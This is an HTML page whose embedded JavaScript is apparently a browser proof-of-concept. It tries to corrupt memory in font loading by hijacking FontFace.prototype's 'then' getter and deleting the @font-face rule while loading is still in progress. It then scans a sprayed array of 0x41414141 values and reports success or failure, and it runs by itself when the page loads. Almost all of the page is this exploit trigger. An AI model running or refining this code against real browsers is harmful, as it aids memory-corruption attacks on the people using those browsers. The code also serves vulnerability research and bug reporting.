<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(nonexistent.woff); unicode-range: U+0041; }
    </style>
</head>
<body>
    <div id="debug" style="color: #0f0; font-family: monospace;">Initiating...</div>
    <div id="dummy" style="font-family: 'x';">A</div> <script>
        const debug = document.getElementById('debug');
        const MAGIC_VALUE = 0x41414141;
        let victim = new Uint32Array(32);
        victim.fill(MAGIC_VALUE);

        function testOverlap() {
            debug.innerText = "Triggering...";
            
            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);

            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    debug.innerText = "Callback reached!";
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    let corrupted = false;
                    for (let i = 0; i < victim.length; i++) {
                        if (victim[i] !== MAGIC_VALUE) {
                            corrupted = true;
                            debug.innerText = "SUCCESS: Corrupted at " + i + " | Value: " + victim[i].toString(16);
                            break;
                        }
                    }
                    if (!corrupted) debug.innerText = "FAILED: Memory intact.";
                    return undefined;
                }
            });
            
            // إجبار المحرك على التحميل
            document.fonts.load('1em x', 'A').catch(e => { debug.innerText = "Error: " + e; });
        }

        setTimeout(testOverlap, 1000);
    </script>
</body>
</html>
